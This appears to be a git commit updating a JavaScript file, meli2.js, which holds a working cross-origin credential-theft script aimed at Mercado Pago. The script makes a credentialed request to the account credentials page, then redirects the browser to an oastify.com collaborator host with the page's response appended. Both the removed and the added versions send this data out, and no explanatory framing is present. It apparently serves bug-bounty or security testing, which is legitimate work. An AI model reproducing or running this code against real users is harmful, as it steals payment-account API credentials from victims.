545319789d2e4f654b8c0454811207269eeadac7
mariomejia127 <mariomejia127@gmail.com>
2022-11-21 11:03:45 -0600

    Update meli2.js

--- meli2.js
+++ meli2.js
@@ -1,8 +1,15 @@
 var xhr = new XMLHttpRequest();
-xhr.onload = reqListener;
-xhr.open('get','https://www.mercadopago.com.mx/settings/account/credentials',true);
-xhr.withCredentials = true;
-
-function reqListener() {
-    location='https://0bc9abiafotb44wy54id9xatrkxbl5it7.oastify.com/log?key='+this.responseText;
-}
+        xhr.open("GET", "https:\/\/www.mercadopago.com.mx\/settings\/account\/credentials", true);
+        xhr.onload = reqListener;
+        xhr.setRequestHeader("accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
+        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      
+        function reqListener() {
+            location='https://cbrlanimf0tn4gwa5gip99a5rwxnlhj58.oastify.com/log?key='+this.responseText;
+        }
